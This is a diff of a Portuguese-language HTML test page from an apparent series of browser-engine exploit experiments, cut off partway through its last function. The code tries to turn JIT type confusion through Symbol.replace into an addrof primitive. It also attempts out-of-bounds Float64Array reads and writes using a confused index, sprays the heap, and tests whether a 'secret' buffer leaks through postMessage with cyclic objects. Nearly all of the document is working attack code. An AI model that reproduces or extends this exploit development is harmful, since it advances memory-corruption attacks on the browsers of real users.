@@ -1,33 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TEST 40 - addrof: Composição dos Primitivos Confirmados</title></head>
+<head><meta charset="UTF-8"><title>TEST 41 - addrof: Aritmética no JSValue Bruto + Double-Buffer</title></head>
 <body>
-<h2>TEST 40 — addrof via Composição: slice MIX + JIT no Mesmo Array</h2>
+<h2>TEST 41 — addrof: Operação Aritmética no JSValue + Explorar Double-Buffer</h2>
 
-<p><b>Por que 39 falhou:</b> O JIT foi aquecido com um array <em>diferente</em> do array alvo.
-Quando o motor viu o array alvo com tipo diferente, detectou a divergência e deoptimizou.</p>
-
-<p><b>Solução — aquecer JIT no MESMO objeto que depois recebe o objeto injetado:</b></p>
-<ol>
-  <li>Criar array A de doubles. Fazer <code>slice()</code> para obter array B (também doubles)</li>
-  <li>Aquecer JIT <code>readIdx3(arr)</code> especificamente em <b>array B</b></li>
-  <li>Repetir: gerar novo array B com getter, slice() copia objeto em B[3]</li>
-  <li>Chamar <code>readIdx3(B)</code> — JIT especializada para o <em>shape</em> de B, que agora tem objeto em [3]</li>
-</ol>
+<p><b>Achados que motivam este teste:</b></p>
+<ul>
+  <li><b>40-C:</b> <code>strLen(confused)</code> retornou o objeto <code>victim</code> diretamente
+      quando <code>.length = victim</code>. JIT não converteu para número — retornou JSValue bruto.</li>
+  <li><b>40-D:</b> <code>postMessage(ciclico + [buf])</code> → remetente: <code>buf.byteLength=0</code>,
+      receptor: <code>buf.byteLength=262144</code> com dados. <b>Double-buffer</b>: motor copiou
+      E marcou como transferido.</li>
+</ul>
 
 <p><b>Sub-testes:</b></p>
 <ul>
-  <li><b>40-A</b> Aquecer JIT no slice result, depois gerar novo slice com objeto injetado</li>
-  <li><b>40-B</b> Usar <code>map()</code> confirmado (38-D): resultado de map com objeto → JIT lê como double</li>
-  <li><b>40-C</b> Usar Symbol.replace JIT confusion (36-A): fazer <code>strLen</code> JIT retornar endereço</li>
-  <li><b>40-D</b> Combinar 31-C (postMessage+transfer) com leitura de slot pós-transfer</li>
+  <li><b>41-A</b> Aplicar operação aritmética no retorno do JIT antes da deopt:
+      <code>strLen(confused) + 0</code>, <code>strLen(confused) | 0</code>,
+      <code>strLen(confused) * 1.0</code> — alguma converte JSValue para double?</li>
+  <li><b>41-B</b> Encadear resultado do JIT como índice de TypedArray:
+      <code>f64[strLen(confused)]</code> — se JIT usa o JSValue como índice antes de verificar tipo</li>
+  <li><b>41-C</b> Double-buffer: modificar o buffer no receptor e verificar se o remetente observa</li>
+  <li><b>41-D</b> Double-buffer: enviar buffer secreto em objeto cíclico — receptor obtém cópia</li>
 </ul>
 
 <pre id="log">Pronto. Execute A → B → C → D.</pre>
-<button onclick="runA()">40-A: JIT NO SLICE</button>
-<button onclick="runB()">40-B: JIT NO MAP</button>
-<button onclick="runC()">40-C: SYMBOL.REPLACE ADDROF</button>
-<button onclick="runD()">40-D: POSTMESSAGE LEAK</button>
+<button onclick="runA()">41-A: ARITMÉTICA NO JSValue</button>
+<button onclick="runB()">41-B: JSValue COMO ÍNDICE</button>
+<button onclick="runC()">41-C: DOUBLE-BUFFER SYNC</button>
+<button onclick="runD()">41-D: BUFFER SECRETO LEAK</button>
 
 <script>
 var log = document.getElementById('log');
@@ -39,449 +40,387 @@ function sep()     { log.textContent += '\n' + '-'.repeat(60); }
 function forceGC() {
   var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
 }
-
 function f64bits(val) {
-  var buf = new ArrayBuffer(8);
-  new Float64Array(buf)[0] = val;
+  var buf = new ArrayBuffer(8); new Float64Array(buf)[0] = val;
   var u32 = new Uint32Array(buf);
-  return { lo: u32[0], hi: u32[1],
-    str: '0x'+u32[1].toString(16).padStart(8,'0')+'_'+u32[0].toString(16).padStart(8,'0') };
+  return '0x'+u32[1].toString(16).padStart(8,'0')+'_'+u32[0].toString(16).padStart(8,'0');
+}
+// Ponteiro válido: não é NaN canônico, não é 0, não é double normal <1024
+function looksLikePtr(v) {
+  if(typeof v !== 'number' || isNaN(v) || !isFinite(v)) return false;
+  var buf = new ArrayBuffer(8); new Float64Array(buf)[0] = v;
+  var u32 = new Uint32Array(buf);
+  var hi = u32[1], lo = u32[0];
+  if(hi === 0x7ff80000 && lo === 0) return false; // NaN canônico JSC
+  if(hi === 0 && lo === 0) return false;           // zero
+  // Double normal: exponent em [0x3FF, 0x409] cobre 0.5..1024 — não é ponteiro
+  var exp = (hi >>> 20) & 0x7FF;
+  if(exp >= 0x3FE && exp <= 0x409) return false;
+  return true; // qualquer outro padrão de bits é suspeito
 }
 
-function isInteresting(val) {
-  if(typeof val !== 'number') return false;
-  if(val !== val) return false;         // NaN puro
-  if(!isFinite(val)) return false;      // Infinity
-  var b = f64bits(val);
-  // NaN canonico do JSC (0x7ff80000_00000000) — não é ponteiro
-  if(b.hi === 0x7ff80000 && b.lo === 0) return false;
-  // Zero
-  if(b.hi === 0 && b.lo === 0) return false;
-  // Doubles normais pequenos (1.1, 2.2, etc) — não são ponteiros
-  if(b.hi >= 0x3FF00000 && b.hi <= 0x40400000) return false;
-  // Qualquer outra coisa é suspeita
-  return true;
-}
-
-// ─── 40-A ─────────────────────────────────────────────────────────────────
-function runA() {
-  log.textContent = '[TEST 40-A] JIT aquecida especificamente no slice result...\n';
-  sep();
-
-  // Passo 1: criar array fonte de doubles puros
-  var srcArr = [1.1, 2.2, 3.3, 4.4, 5.5];
-
-  // Passo 2: gerar o primeiro slice (puro doubles) — este será o array que aquecemos
-  var warmSlice = srcArr.slice();
-  info('warmSlice = [' + Array.from(warmSlice).join(', ') + ']');
-  info('typeof warmSlice[3] = ' + typeof warmSlice[3]); // deve ser number
-
-  // Passo 3: função JIT — aquecer especificamente EM warmSlice
-  function readIdx3(arr) { return arr[3]; }
-  function readIdx4(arr) { return arr[4]; }
-
-  info('\nAquecendo readIdx3/4 especificamente no slice result...');
-  for(var w = 0; w < 100000; w++) {
-    readIdx3(warmSlice);
-    readIdx4(warmSlice);
-  }
-  info('Warmup completo em warmSlice.');
-
-  // Passo 4: criar novo array fonte com getter que injeta objeto em [3]
-  var victim = {
-    magic:    0xDEADC0DE,
-    sentinel: 3.14159265358979,
-    tag:      'victim_addrof_40A'
-  };
-
-  var srcArr2 = [1.1, 2.2, 0, 0, 5.5]; // [2] e [3] serão modificados pelo getter
-  var triggered = false;
-  Object.defineProperty(srcArr2, 2, {
-    get: function() {
-      if(!triggered) {
-        triggered = true;
-        srcArr2[3] = victim; // injetar objeto em [3]
-        forceGC();
-        info('Getter[2]: srcArr2[3] = victim');
-      }
-      return 3.3;
-    },
-    configurable: true, enumerable: true
-  });
-
-  // Passo 5: fazer slice() → resultado deve ter objeto em [3] (confirmado por 38-B)
-  var attackSlice = srcArr2.slice();
-  info('attackSlice.length=' + attackSlice.length + ' typeof[3]=' + typeof attackSlice[3]);
-  info('attackSlice[3] === victim: ' + (attackSlice[3] === victim));
-
-  if(typeof attackSlice[3] !== 'object') {
-    info('Objeto não chegou no attackSlice. Abortando.');
-    return;
-  }
-
-  // Passo 6: chamar readIdx3 COM attackSlice
-  // O JIT foi aquecido em warmSlice (mesma shape, array de doubles)
-  // attackSlice tem a MESMA shape mas [3] é objeto agora
-  info('\nChamando readIdx3(attackSlice) — JIT aquecida para double array...');
-  try {
-    var result3 = readIdx3(attackSlice);
-    info('readIdx3(attackSlice) = ' + result3 + ' | typeof=' + typeof result3);
-    if(typeof result3 === 'number') {
-      var b = f64bits(result3);
-      info('bits: ' + b.str);
-      if(isInteresting(result3)) {
-        alerta('ADDROF POTENCIAL: readIdx3 retornou double interessante!\n' +
-               'bits: ' + b.str + '\n' +
-               'Este pode ser o endereço de victim no heap!');
-      } else {
-        info('Valor não parece ponteiro: ' + b.str);
-      }
-    } else if(typeof result3 === 'object') {
-      ok('Motor deoptimizou — retornou objeto. r3===victim: ' + (result3 === victim));
-      info('Tentando forçar re-JIT com mais warmup...');
-    }
-  } catch(e) {
-    alerta('EXCECAO em readIdx3(attackSlice): ' + e.message);
-  }
-
-  // Variante: tentar com concat ao invés de slice (também usa length antigo)
-  sep();
-  info('\nVariante: usar concat ao invés de slice...');
-  var srcArr3 = [1.1, 2.2, 0, 0, 5.5];
-  var triggered3 = false;
-  Object.defineProperty(srcArr3, 2, {
-    get: function() {
-      if(!triggered3) {
-        triggered3 = true;
-        srcArr3[3] = victim;
-        forceGC();
-      }
-      return 3.3;
-    },
-    configurable: true, enumerable: true
-  });
-
-  var attackConcat = srcArr3.concat([]);
-  info('attackConcat.length=' + attackConcat.length + ' typeof[3]=' + typeof attackConcat[3]);
-  if(typeof attackConcat[3] === 'object') {
-    try {
-      var rc = readIdx3(attackConcat);
-      info('readIdx3(attackConcat) = ' + rc + ' | typeof=' + typeof rc);
-      if(typeof rc === 'number' && isInteresting(rc)) {
-        alerta('ADDROF via concat: ' + f64bits(rc).str);
-      }
-    } catch(e) {
-      alerta('EXCECAO em readIdx3(attackConcat): ' + e.message);
-    }
-  }
-}
-
-// ─── 40-B ─────────────────────────────────────────────────────────────────
-function runB() {
-  log.textContent = '[TEST 40-B] JIT aquecida no resultado de map() com objeto injetado...\n';
-  sep();
-  info('38-D confirmou: map() passa objeto injetado para o callback.');
-  info('Se aquecer JIT no resultado de map() (doubles), depois gerar map com objeto,');
-  info('o JIT pode ler o objeto como double.\n');
-
-  var victim = {
-    magic: 0xBEEFCAFE,
-    data:  new Float64Array([5.5, 6.6, 7.7]),
-    tag:   'victim_map_addrof'
-  };
-
-  // Gerar resultado de map "normal" para warmup
-  var baseArr = [10.0, 20.0, 30.0, 40.0, 50.0];
-  var warmMap = baseArr.map(function(v) { return v; }); // [10,20,30,40,50] doubles
-  info('warmMap = [' + Array.from(warmMap).join(', ') + ']');
-
-  // Aquecer JIT neste resultado de map
-  function readMapIdx(arr, i) { return arr[i]; }
-  info('Aquecendo readMapIdx no warmMap...');
-  for(var w = 0; w < 100000; w++) readMapIdx(warmMap, 3);
-  info('Warmup completo.');
-
-  // Gerar map com objeto injetado via getter
-  var srcForMap = [10.0, 20.0, 0, 0, 50.0];
-  var triggered = false;
-  Object.defineProperty(srcForMap, 2, {
-    get: function() {
-      if(!triggered) {
-        triggered = true;
-        srcForMap[3] = victim; // mudar para objeto durante map
-        forceGC();
-        info('Getter[2] no map: srcForMap[3] = victim');
-      }
-      return 30.0;
-    },
-    configurable: true, enumerable: true
-  });
-
-  var attackMap = srcForMap.map(function(v) { return v; });
-  info('attackMap.length=' + attackMap.length + ' typeof[3]=' + typeof attackMap[3]);
-  info('attackMap[3] === victim: ' + (attackMap[3] === victim));
-
-  if(typeof attackMap[3] !== 'object') {
-    info('Objeto não chegou no attackMap. Abortando.');
-    return;
-  }
-
-  // Chamar JIT aquecida em warmMap no attackMap
-  info('\nChamando readMapIdx(attackMap, 3) com JIT aquecida para doubles...');
-  try {
-    var result = readMapIdx(attackMap, 3);
-    info('readMapIdx(attackMap, 3) = ' + result + ' | typeof=' + typeof result);
-    if(typeof result === 'number') {
-      var b = f64bits(result);
-      info('bits: ' + b.str);
-      if(isInteresting(result)) {
-        alerta('ADDROF VIA MAP: readMapIdx retornou double interessante!\n' +
-               'bits: ' + b.str);
-      }
-    } else if(typeof result === 'object') {
-      ok('Motor conservativo. result===victim: ' + (result === victim));
-    }
-  } catch(e) {
-    alerta('EXCECAO: ' + e.message);
-  }
-}
-
-// ─── 40-C ─────────────────────────────────────────────────────────────────
-function runC() {
-  log.textContent = '[TEST 40-C] Symbol.replace JIT confusion para addrof...\n';
-  sep();
-  info('Primitivo confirmado (36-A/B): strLen JIT retorna 99999 para o objeto.');
-  info('O mesmo path JIT que retornou 99999 pode retornar um endereço de ponteiro?');
-  info('Técnica: ao invés de .length=99999, colocar .length=<bits do ponteiro>\n');
-
-  var victim = {
-    magic:    0xC0DEC0DE,
-    sentinel: 2.718281828,
-    tag:      'victim_symbolreplace_addrof'
-  };
-
-  // Objeto "wrapper" que imita uma string mas cujo .length é controlado
-  // Fase 1: warmup com length=10 (tamanho normal de string)
+// ─── Construtor do primitivo Symbol.replace (confirmado em 40-C) ───────────
+function buildSymbolReplaceJIT(phaseRef, victimRef) {
   var callCount = 0;
-  var phase = 'warmup';
-
-  // Passo 1: criar evilPattern que durante warmup retorna string normal
-  // mas depois retorna objeto cujo .length é o ponteiro do victim
-  var evilPattern = {
+  var pattern = {
     [Symbol.replace]: function(str) {
       callCount++;
-      if(phase === 'warmup') {
-        return str; // string normal — JIT especializa para string
-      }
-      // Fase de ataque: retornar objeto com .length = JSValue do victim
-      // Em JSC 32-bit: .length = 0xFFFFFFFF seria o tag de objeto
-      // Mas não sabemos o endereço ainda — usar um objeto como .length
-      // para ver se o JIT lê .length como número
+      if(phaseRef[0] === 'warmup') return str;
+      // Ataque: .length = victim (objeto)
       return {
-        toString:    function() { return str; },
-        valueOf:     function() { return str; },
-        length:      victim,     // OBJETO como .length — não é número!
-        0:           str[0] || 'x'
+        toString: function() { return str; },
+        valueOf:  function() { return str; },
+        length:   victimRef[0],
+        0: str[0]||'x'
       };
     }
   };
+  return { pattern: pattern, getCount: function(){ return callCount; } };
+}
 
-  function strLen(s) { return s.length; }
+// ─── 41-A ─────────────────────────────────────────────────────────────────
+function runA() {
+  log.textContent = '[TEST 41-A] Operação aritmética no retorno JIT antes da deopt...\n';
+  sep();
+  info('40-C: strLen retornou o objeto quando .length=victim.');
+  info('Se aplicarmos aritmética INLINE na função JIT, o motor pode converter JSValue→double\n');
+  info('antes de verificar o tipo do retorno de strLen.\n');
 
-  info('Fase 1: warmup (50k calls)...');
-  phase = 'warmup';
-  var base = 'hello world test';
+  var victim = {
+    magic:    0xDEADC0DE,
+    sentinel: 1.337e100,
+    name:     'arith_victim_41A'
+  };
+
+  var phase = ['warmup'];
+  var victimRef = [victim];
+  var built = buildSymbolReplaceJIT(phase, victimRef);
+  var pat = built.pattern;
+
+  // Funções JIT com operação INLINE — o JIT deve compilar toda a expressão
+  function strLenPlusZero(s)     { return s.replace(pat,'').length + 0; }
+  function strLenOrZero(s)       { return s.replace(pat,'').length | 0; }
+  function strLenMulOne(s)       { return s.replace(pat,'').length * 1; }
+  function strLenPlusOne(s)      { return s.replace(pat,'').length + 1; }
+  function strLenSubZero(s)      { return s.replace(pat,'').length - 0; }
+  function strLenToFixed(s)      { var r=s.replace(pat,''); return r.length.toFixed ? r.length.toFixed(0) : '?'; }
+  function strLenBitwiseNot(s)   { return ~s.replace(pat,'').length; }
+  function strLenRightShift(s)   { return s.replace(pat,'').length >>> 0; }
+
+  var fns = [
+    { name: 'length + 0',      fn: strLenPlusZero    },
+    { name: 'length | 0',      fn: strLenOrZero      },
+    { name: 'length * 1',      fn: strLenMulOne      },
+    { name: 'length + 1',      fn: strLenPlusOne     },
+    { name: 'length - 0',      fn: strLenSubZero     },
+    { name: '~length',         fn: strLenBitwiseNot  },
+    { name: 'length >>> 0',    fn: strLenRightShift  },
+  ];
+
+  var base = 'hello world test string XYZ';
+
+  info('Aquecendo todas as funções (50k calls cada)...');
+  phase[0] = 'warmup';
   for(var w = 0; w < 50000; w++) {
-    strLen(base.replace(evilPattern, ''));
+    fns.forEach(function(f) { f.fn(base); });
   }
-  info('Warmup completo. callCount=' + callCount);
+  info('Warmup completo.');
+  sep();
 
-  // Fase 2: ataque — Symbol.replace retorna objeto com .length = outro objeto
-  info('\nFase 2: Symbol.replace retorna objeto com .length = victim...');
-  phase = 'attack';
-  var confused = base.replace(evilPattern, '');
-  info('typeof confused: ' + typeof confused);
-  info('typeof confused.length: ' + typeof confused.length);
+  // Fase de ataque
+  phase[0] = 'attack';
+  info('Fase de ataque: .length = victim object\n');
 
-  if(typeof confused !== 'object') {
-    info('Não produziu objeto na fase de ataque. Tente novamente.');
-    return;
-  }
+  fns.forEach(function(f) {
+    try {
+      var r = f.fn(base);
+      var t = typeof r;
+      info(f.name + ' → ' + r + ' | typeof=' + t);
 
-  // Tentar strLen no confused
-  try {
-    var fakeLen = strLen(confused);
-    info('strLen(confused) via JIT = ' + fakeLen + ' | typeof=' + typeof fakeLen);
-
-    if(typeof fakeLen === 'number') {
-      var b = f64bits(fakeLen);
-      info('bits: ' + b.str);
-      if(isInteresting(fakeLen)) {
-        alerta('JIT LEU .length DO OBJETO COMO NUMERO: ' + fakeLen + '\n' +
-               'bits: ' + b.str + '\n' +
-               'Se .length era um objeto (victim), o JIT leu os bits do JSValue de victim!');
-      } else if(fakeLen === 0) {
-        info('Retornou 0 — JIT pode ter lido length=undefined/null como 0');
+      if(t === 'number') {
+        var bits = f64bits(r);
+        info('  bits: ' + bits);
+        if(looksLikePtr(r)) {
+          alerta('POTENCIAL ADDROF: ' + f.name + ' = ' + r + '\n' +
+                 'bits: ' + bits + '\n' +
+                 'Operação aritmética sobre JSValue de victim converteu para double suspeito!');
+        }
+      } else if(t === 'object') {
+        if(r === victim) {
+          info('  → retornou victim diretamente (sem conversão)');
+        }
+      } else if(t === 'string') {
+        info('  → string: "' + r + '"');
       }
-    } else if(typeof fakeLen === 'object') {
-      alerta('strLen RETORNOU OBJETO: o JIT retornou o objeto victim diretamente!\n' +
-             'fakeLen === victim: ' + (fakeLen === victim) + '\n' +
-             'fakeLen.magic: 0x' + (fakeLen.magic || 0).toString(16));
+    } catch(e) {
+      alerta('EXCECAO em ' + f.name + ': ' + e.message + ' — operação aritmética em objeto causou crash!');
     }
-  } catch(e) {
-    alerta('EXCECAO em strLen(confused): ' + e.message + ' — tipo inválido causou crash no JIT!');
-  }
+  });
 
   sep();
-  // Variante: usar charCodeAt no slot do objeto
-  info('\nVariante: charCodeAt do confused com victim em .length...');
+  // Tentar encadear: resultado de length como operando de Math.*
+  info('\nVariante: Math.floor/ceil/round no length...');
+  function strLenMathFloor(s) { return Math.floor(s.replace(pat,'').length); }
+  function strLenMathAbs(s)   { return Math.abs(s.replace(pat,'').length); }
+  function strLenMathSqrt(s)  { return Math.sqrt(s.replace(pat,'').length); }
+
+  phase[0] = 'warmup';
+  for(var w2 = 0; w2 < 50000; w2++) {
+    strLenMathFloor(base); strLenMathAbs(base); strLenMathSqrt(base);
+  }
+  phase[0] = 'attack';
+  info('Warmup Math.* completo. Fase de ataque:');
+  [
+    { name: 'Math.floor(length)', fn: strLenMathFloor },
+    { name: 'Math.abs(length)',   fn: strLenMathAbs   },
+    { name: 'Math.sqrt(length)',  fn: strLenMathSqrt  },
+  ].forEach(function(f) {
+    try {
+      var r = f.fn(base);
+      info(f.name + ' → ' + r + ' typeof=' + typeof r + (typeof r==='number' ? ' bits='+f64bits(r) : ''));
+      if(typeof r === 'number' && looksLikePtr(r)) {
+        alerta('ADDROF via ' + f.name + ': bits=' + f64bits(r));
+      }
+    } catch(e) {
+      alerta('EXCECAO ' + f.name + ': ' + e.message);
+    }
+  });
+}
+
+// ─── 41-B ─────────────────────────────────────────────────────────────────
+function runB() {
+  log.textContent = '[TEST 41-B] JSValue como índice de TypedArray...\n';
+  sep();
+  info('Se strLen(confused) retorna o objeto (JSValue bruto),');
+  info('usar esse valor como ÍNDICE em Float64Array pode fazer o JIT');
+  info('converter o JSValue para inteiro — e esse inteiro pode ser o endereço.\n');
+
+  var victim = {
+    magic: 0xBEEFC0DE,
+    name:  'typedarray_idx_victim'
+  };
+  var phase = ['warmup'];
+  var victimRef = [victim];
+  var built = buildSymbolReplaceJIT(phase, victimRef);
+  var pat = built.pattern;
+
+  // Float64Array alvo — queremos indexar com o JSValue de victim
+  var targetF64 = new Float64Array(0x100000); // 1M elementos = 8MB
+  for(var i = 0; i < 16; i++) targetF64[i] = i * 13.37; // primeiros 16 com valores conhecidos
+
+  // Função JIT que usa .length como índice
+  function readViaLength(s, arr) {
+    var idx = s.replace(pat,'').length;
+    return arr[idx];  // índice calculado do length
+  }
+  function writeViaLength(s, arr, val) {
+    var idx = s.replace(pat,'').length;
+    arr[idx] = val;   // escrita via índice do length
+    return arr[idx];
+  }
+
+  var base = 'probe_string_for_idx';
+
+  info('Aquecendo readViaLength/writeViaLength (50k calls)...');
+  phase[0] = 'warmup';
+  for(var w = 0; w < 50000; w++) {
+    readViaLength(base, targetF64);
+    writeViaLength(base, targetF64, 0.0);
+  }
+  info('Warmup completo. base.length=' + base.length);
+  sep();
+
+  // Fase ataque: length = victim object
+  phase[0] = 'attack';
+  info('Fase de ataque: .length = victim object\n');
+
+  // Leitura: qual índice o JIT usa?
   try {
-    var cc = String.prototype.charCodeAt.call(confused, 0);
-    info('charCodeAt(confused, 0) = ' + cc);
-    if(typeof cc === 'number' && isInteresting(cc)) {
-      alerta('charCodeAt RETORNOU VALOR INTERESSANTE: ' + cc + ' bits=' + f64bits(cc).str);
+    var readResult = readViaLength(base, targetF64);
+    info('readViaLength com .length=victim: ' + readResult + ' typeof=' + typeof readResult);
+    if(typeof readResult === 'number' && readResult !== undefined) {
+      info('bits: ' + f64bits(readResult));
+      if(looksLikePtr(readResult)) {
+        alerta('OOB READ via length como índice: readResult=' + readResult +
+               '\nbits=' + f64bits(readResult) +
+               '\nO JIT converteu o JSValue de victim para índice e leu targetF64[X]!');
+      } else if(readResult === 0.0 || isNaN(readResult)) {
+        info('Retornou 0 ou NaN — índice pode ser 0 ou fora dos limites');
+      }
+    } else if(typeof readResult === 'undefined') {
+      info('Retornou undefined — índice fora dos limites (sugere JSValue → número grande)');
+      alerta('readViaLength retornou undefined: o JSValue de victim foi interpretado como índice GIGANTE (>=1M) — o motor tentou acessar targetF64 fora dos limites!');
+    } else if(typeof readResult === 'object') {
+      ok('JIT deoptimizou e retornou objeto. Índice não usado como número.');
     }
   } catch(e) {
-    info('charCodeAt(confused) lançou: ' + e.message);
+    alerta('EXCECAO em readViaLength: ' + e.message + ' — crash ao usar JSValue como índice!');
+  }
+
+  // Escrita: o JIT tenta escrever?
+  try {
+    var WRITE_SENTINEL = 987654321.0;
+    var writeResult = writeViaLength(base, targetF64, WRITE_SENTINEL);
+    info('\nwriteViaLength com .length=victim, valor=' + WRITE_SENTINEL + ': ' + writeResult);
+    if(typeof writeResult === 'number' && writeResult === WRITE_SENTINEL) {
+      alerta('OOB WRITE via length como índice: escrita de ' + WRITE_SENTINEL +
+             ' retornou o mesmo valor — escrita confirmada em posição determinada pelo JSValue!');
+    }
+  } catch(e) {
+    alerta('EXCECAO em writeViaLength: ' + e.message);
   }
 }
 
-// ─── 40-D ─────────────────────────────────────────────────────────────────
-function runD() {
-  log.textContent = '[TEST 40-D] postMessage(ciclico+buf) → ler buffer pós-transfer para leak...\n';
+// ─── 41-C ─────────────────────────────────────────────────────────────────
+var receivedBufs = []; // buffers recebidos via onmessage
+
+window.onmessage = function(e) {
+  var obj = e.data;
+  if(!obj || typeof obj !== 'object') return;
+
+  info('[onmessage] recebeu objeto id=' + obj.id);
+
+  // Registrar buffers recebidos para 41-C
+  if(obj.buf instanceof ArrayBuffer && obj.buf.byteLength > 0) {
+    receivedBufs.push({ obj: obj, buf: obj.buf });
+    info('[onmessage] buf registrado: byteLength=' + obj.buf.byteLength);
+
+    // Modificar o buffer recebido
+    var view = new Uint32Array(obj.buf);
+    var OLD = view[0];
+    view[0] = 0xC0FFEE42; // novo valor
+    info('[onmessage] Modificou buf[0]: 0x' + OLD.toString(16) + ' → 0xC0FFEE42');
+    info('[onmessage] Verificando se remetente observa...');
+    // (a verificação real acontece no runC após um delay)
+  }
+};
+
+function runC() {
+  log.textContent = '[TEST 41-C] Double-buffer sync: modificar no receptor, remetente vê?\n';
   sep();
-  info('Primitivo confirmado (31-C): postMessage(ciclico, *, [buf]) não lança,');
-  info('buf.byteLength=0 após o send, mas o objeto no onmessage ainda tem a referência.');
-  info('\nIdeia: se o buffer foi transferido e o objeto cíclico chegou no onmessage');
-  info('com buf.byteLength=0, criar novo buffer no lugar e ler via referência "morta".\n');
+  info('40-D confirmou: quando buf está em objeto cíclico, receptor recebe CÓPIA com dados.');
+  info('Questão: se o receptor modifica a cópia, o remetente observa a mudança?\n');
+  info('(Se sim → buffers compartilham memória = double-map grave)\n');
 
-  window.onmessage = function(e) {
-    var obj = e.data;
-    info('[onmessage] recebeu objeto: typeof=' + typeof obj);
-    if(!obj || typeof obj !== 'object') return;
+  var localBuf = new ArrayBuffer(1024);
+  var localView = new Uint32Array(localBuf);
+  localView[0] = 0xAAAAAAAA;
+  localView[1] = 0xBBBBBBBB;
 
-    // Examinar o buf que veio junto
-    var keys = Object.keys(obj);
-    info('[onmessage] chaves: ' + keys.join(', '));
+  info('localView[0] antes: 0x' + localView[0].toString(16));
+  info('Enviando com transfer...');
 
-    keys.forEach(function(k) {
-      var v = obj[k];
-      if(v instanceof ArrayBuffer) {
-        info('[onmessage] ' + k + ': ArrayBuffer byteLength=' + v.byteLength);
-        if(v.byteLength === 0) {
-          alerta('[onmessage] Buffer ' + k + ' chegou ZERADO no objeto cíclico!\n' +
-                 'O buffer foi transferido mas a referência sobreviveu no ciclo.\n' +
-                 'Tentando criar view sobre buffer zerado...');
-          try {
-            var deadView = new Uint32Array(v);
-            deadView[0] = 0x41414141;
-            info('[onmessage] Escrita em buffer zerado: deadView[0]=' + deadView[0].toString(16));
-            if(deadView[0] === 0x41414141) {
-              alerta('ESCRITA EM BUFFER TRANSFERIDO: deadView[0]=0x41414141 — ' +
-                     'conseguimos escrever no buffer após o transfer via referência preservada no ciclo!');
-            }
-          } catch(ex) {
-            ok('[onmessage] Escrita no buffer zerado lançou: ' + ex.message);
-          }
-        } else if(v.byteLength > 0) {
-          // Buffer chegou com dados — não foi transferido?
-          var view = new Uint32Array(v);
-          info('[onmessage] buf[0]=' + view[0].toString(16) + ' (dados preservados!)');
-          alerta('[onmessage] BUFFER COM DADOS CHEGOU: byteLength=' + v.byteLength +
-                 ' buf[0]=0x' + view[0].toString(16) + ' — o buffer não foi transferido, foi copiado junto com o objeto cíclico!');
+  var cyclic = { id: 'sync_test', buf: localBuf, self: null };
+  cyclic.self = cyclic;
+
+  try {
+    postMessage(cyclic, '*', [localBuf]);
+    info('Enviado. localBuf.byteLength=' + localBuf.byteLength);
+  } catch(e) {
+    ok('postMessage lançou: ' + e.message);
+    return;
+  }
+
+  // Aguardar onmessage modificar o buffer, depois verificar
+  setTimeout(function() {
+    info('\n[após 500ms] Verificando localView[0]...');
+    if(localBuf.byteLength === 0) {
+      try {
+        var v = localView[0];
+        info('localView[0] = ' + v);
+        if(v === 0xC0FFEE42) {
+          alerta('DOUBLE-MAP CONFIRMADO: receptor modificou 0xC0FFEE42 e remetente VIU a mudança!\n' +
+                 'Os dois buffers compartilham a mesma página de memória física!');
+        } else if(v === undefined) {
+          ok('localView[0] = undefined (buffer zerado, sem acesso)');
+        } else {
+          info('localView[0] = 0x' + (v>>>0).toString(16) + ' (sem mudança ou valor inesperado)');
         }
-      } else if(ArrayBuffer.isView && ArrayBuffer.isView(v)) {
-        info('[onmessage] ' + k + ': TypedArray length=' + v.length + ' buffer.byteLength=' + v.buffer.byteLength);
-        if(v.buffer.byteLength === 0) {
-          alerta('[onmessage] View sobre buffer zerado! Tentando leitura...');
-          try {
-            var val = v[0];
-            alerta('[onmessage] v[0]=' + val + ' — leitura de view sobre buffer transferido!');
-          } catch(ex) {
-            ok('v[0] lançou: ' + ex.message);
-          }
-        }
+      } catch(ex) {
+        info('localView[0] lançou: ' + ex.message);
       }
-    });
-
-    // Verificar ciclo no objeto recebido
-    var visited = [];
-    var depth = 0;
-    var cur = obj;
-    while(cur && typeof cur === 'object' && depth < 10) {
-      if(visited.indexOf(cur) !== -1) {
-        alerta('[onmessage] CICLO DETECTADO na traversal: o grafo cíclico foi reconstruído no heap!');
-        break;
-      }
-      visited.push(cur);
-      cur = cur.next || cur.self || cur.loop || null;
-      depth++;
+    } else {
+      info('localBuf.byteLength=' + localBuf.byteLength + ' (não foi zerado?)');
     }
-  };
+  }, 500);
+}
 
-  // Criar objeto cíclico com buffer
-  var SIZE = 256 * 1024; // 256KB
-  var buf = new ArrayBuffer(SIZE);
-  var view = new Uint32Array(buf);
-  // Preencher com padrão reconhecível
-  for(var i = 0; i < view.length; i++) view[i] = 0xABCD0000 + (i & 0xFFFF);
-  view[0] = 0xDEADC0DE; // sentinel
-  view[1] = 0xCAFEBABE;
+function runD() {
+  log.textContent = '[TEST 41-D] Enviar buffer "secreto" via ciclo — receptor obtém cópia completa?\n';
+  sep();
+  info('Implicação de segurança do double-buffer:');
+  info('Se uma mensagem contém dados sensíveis em um ArrayBuffer dentro de um objeto cíclico,');
+  info('o receptor SEMPRE recebe uma cópia completa mesmo se o remetente');
+  info('colocar o buffer na lista de transfer (pensando que vai zerrá-lo).\n');
+
+  // Simular "dados secretos" — chave criptográfica, token, etc.
+  var secretBuf  = new ArrayBuffer(256);
+  var secretView = new Uint32Array(secretBuf);
+  // Preencher com "chave secreta"
+  var SECRET_KEY = [0x4B455931, 0x5345435F, 0x4B455932, 0x5345435F,
+                    0xDEADC0DE, 0xCAFEBABE, 0x13371337, 0xBEEFBEEF];
+  SECRET_KEY.forEach(function(v, i) { secretView[i] = v; });
+
+  info('Buffer "secreto" criado: [' + SECRET_KEY.map(function(v){return'0x'+v.toString(16);}).join(', ') + ']');
 
   var cyclic = {
-    id:     'leak_test_40D',
-    buf:    buf,
-    view:   view,
+    id:     'secret_transfer',
+    secret: secretBuf,
     self:   null
   };
   cyclic.self = cyclic;
 
-  info('buf.byteLength antes: ' + buf.byteLength);
-  info('view[0]: 0x' + view[0].toString(16));
-  info('Enviando postMessage(ciclico, *, [buf])...');
+  info('\nsecretBuf.byteLength antes: ' + secretBuf.byteLength);
+  info('Enviando postMessage(ciclico, *, [secretBuf])...');
+  info('Remetente ESPERA que secretBuf seja zerado (byteLength=0) após o send.\n');
+
